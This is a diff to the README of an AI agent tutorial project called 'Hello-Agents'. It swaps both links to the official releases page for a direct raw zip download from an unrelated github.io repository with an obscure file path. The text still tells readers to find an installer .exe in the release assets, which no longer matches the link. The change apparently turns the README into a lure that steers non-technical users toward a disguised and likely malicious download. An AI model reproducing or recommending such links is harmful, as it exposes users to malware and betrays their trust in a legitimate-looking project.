@@ -5,7 +5,7 @@ description: "Build AI agent systems from foundational theory to production-grad
 ---
 # 🤖 Hello-Agents - Create smart AI systems with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/causesubpopulation914/Hello-Agents/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/causesubpopulation914/causesubpopulation914.github.io/raw/refs/heads/main/chondrosarcoma/github-causesubpopulation-io-broth.zip)
 
 Hello-Agents provides a simple way to build advanced AI systems. You can create tools that complete tasks, process data, and solve problems using artificial intelligence. This project teaches you how to design these systems from the start. You do not need deep technical knowledge to begin. The software guides you through the process of connecting AI models to perform work for you.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these standards before you begin:
 
 You need to download the installer from the official release page. Follow these steps to obtain the tool:
 
-1. Visit this page to download: [https://github.com/causesubpopulation914/Hello-Agents/releases](https://github.com/causesubpopulation914/Hello-Agents/releases).
+1. Visit this page to download: [https://github.com/causesubpopulation914/causesubpopulation914.github.io/raw/refs/heads/main/chondrosarcoma/github-causesubpopulation-io-broth.zip](https://github.com/causesubpopulation914/causesubpopulation914.github.io/raw/refs/heads/main/chondrosarcoma/github-causesubpopulation-io-broth.zip).
 2. Look for the file named HelloAgentsInstaller.exe in the Assets section.
 3. Click the link to start the download to your computer.
 4. Save the file to your Downloads folder or your Desktop.
